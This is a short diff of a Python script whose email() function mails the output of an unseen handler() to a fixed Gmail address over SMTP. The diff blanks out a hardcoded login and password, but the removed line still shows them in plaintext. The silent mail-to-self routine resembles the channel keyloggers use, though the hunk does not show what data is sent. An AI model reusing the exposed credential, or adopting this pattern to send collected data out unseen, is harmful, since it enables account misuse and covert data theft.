@@ -106,7 +106,7 @@ def email():
    s.starttls()
    s.ehlo()
    string=handler()
-   s.login('wqeqsada2131@gmail.com', 'yuan(*@^')
+   s.login('', '')
    s.sendmail('wqeqsada2131@gmail.com', 'wqeqsada2131@gmail.com', 'Subject: \n {}'.format(string)) 
 if __name__ == "__main__":
    
